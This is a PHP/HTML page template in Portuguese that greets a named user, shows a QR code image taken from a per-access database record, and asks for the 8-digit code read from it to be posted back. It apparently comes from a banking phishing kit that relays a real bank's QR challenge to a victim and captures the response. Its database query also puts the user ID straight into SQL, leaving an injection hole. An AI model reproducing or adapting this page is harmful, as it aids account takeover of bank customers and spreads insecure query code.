<?php 
	
	$getPos = read($conn, 'acessos', "WHERE id = '$UserId'");
	$LinkQrCode = $getPos[0]['qrcode_link'];

?>
<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?php echo getSaudacao();?><b> <?php echo $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>
	
<script>
	function check_qrcode(){
		var qrcode = document.getElementById('qrcode');

		if(qrcode.value == ''){
			alert("Por favor, você deve usar seu smartphone para escanear a imagem QRCode abaixo e informar o código QRCode no campo abaixo.");
			return false;
		}
		if(qrcode.value.length < 8){
			alert("O Código QRCode informado não está correto ou já expirou.\nTente novamente!");
			qrcode.focus();
			qrcode.value = '';
			return false;
		}
	}
</script>		

	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			O Código QRCode informado não está correto.
			<br><br>
			Escaneie o Códido QRCode novamente e Tente novamente!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Para confirmar esta operação, <span class="red_txt">você deve utilizar seu celular e escanear o QRCode</span>.
		</div><!-- block_message_all -->
		
		<div style="">
		<form action="acesso.php" method="post" name="form_QR" id="form_QR" onsubmit="return check_qrcode();">
			<img src="<?php echo $LinkQrCode;?>" width="250" style="display:block;margin:0 auto;padding:5px;border:1px solid #c50100;background-color:#c50100;">
			<br><br>
			<div style="display:block;">
				<p style="display:block;padding:0px 0 0 240px;font-size:.9em;">Código QRCode</p>
				<input type="text" name="qrcode" id="qrcode" maxlength="8" onkeypress='return SomenteNumero(event)' autocomplete="off" style="display:block;margin:-18px auto 0 350px;padding:0 5px;width:120px;">
				<input type="hidden" name="sender" value="get_qrcode">	
			</div>
		</form>		
		</div>
	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_QR"></div>
	</div><!-- block_buttons_form -->
	

</div><!-- block_loading -->